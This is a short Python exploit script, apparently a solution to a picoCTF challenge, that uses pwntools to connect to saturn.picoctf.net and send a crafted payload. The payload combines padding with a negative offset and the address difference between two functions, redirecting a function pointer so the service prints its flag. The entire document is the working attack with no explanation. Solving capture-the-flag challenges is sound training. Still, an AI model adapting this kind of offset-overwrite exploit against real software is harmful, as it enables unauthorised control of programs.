#!/usr/bin/python3

from pwn import *
import os

os.system("clear")

elf = ELF("./vuln")

#io = elf.process()
io = remote("saturn.picoctf.net", 64170)

hard_addr = 0x08049436
easy_addr = 0x080492fc
diff = easy_addr - hard_addr

payload = b""
payload += b"A"*19 + b'f' #This length is 1337
payload += b" -16 "
payload += str(diff).encode()

io.sendline(payload)

io.recvuntil(b'flag.\n')

print(io.recvuntil(b'}'))
